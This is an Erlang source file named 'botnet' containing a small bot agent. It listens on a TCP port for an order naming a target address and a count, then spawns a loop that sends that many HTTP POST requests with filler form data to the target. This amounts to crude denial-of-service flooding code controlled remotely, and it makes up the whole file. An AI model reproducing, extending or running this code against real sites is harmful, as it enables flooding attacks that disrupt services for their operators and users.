-module(botnet).
-export([connectionTestServer/1, do_recv/2, start/2, attackTarget/2, connectionTargetServer/1]).

connectionTestServer(Port) ->
    {ok, LSock} = gen_tcp:listen(Port, [binary, {packet, 0},
                                        {active, false}]),
    {ok, Sock} = gen_tcp:accept(LSock),
    {ok, Bin} = do_recv(Sock, []),
    ok = gen_tcp:close(Sock),
    Bin.

connectionTargetServer(Port) ->
    {ok, LSock} = gen_tcp:listen(Port, [binary, {packet, 0},
                                        {active, false}]),
    {ok, Sock} = gen_tcp:accept(LSock),
    {ok, Bin} = do_recv(Sock, []),
    ok = gen_tcp:close(Sock),
    SplitString = string:tokens(binary_to_list(Bin), " "),
    NumberofAttacks = list_to_integer(lists:last(SplitString)),
    Address = lists:last(lists:droplast(SplitString)),
    spawn(botnet, attackTarget, [Address, NumberofAttacks]).

attackTarget(TargetURI, 0) ->
    done;
attackTarget(TargetURI, Times) ->
    ssl:start(),
    application:start(inets),
    httpc:request(post, {TargetURI, [], "application/x-www-form-urlencoded", "bbbbbbbbbbb=aaaaaaaaaaaaaaaaaaaaaaaa"}, [], []),
    attackTarget(TargetURI, Times - 1).

do_recv(Sock, Bs) ->
    case gen_tcp:recv(Sock, 0) of
        {ok, B} ->
            B,
            do_recv(Sock, [Bs, B]);
        {error, closed} ->
            {ok, list_to_binary(Bs)}
    end.

start(TestPort, AttackOrderPort) ->
    spawn(botnet, connectionTestServer, [TestPort]),
    spawn(botnet, connectionTargetServer, [AttackOrderPort]).
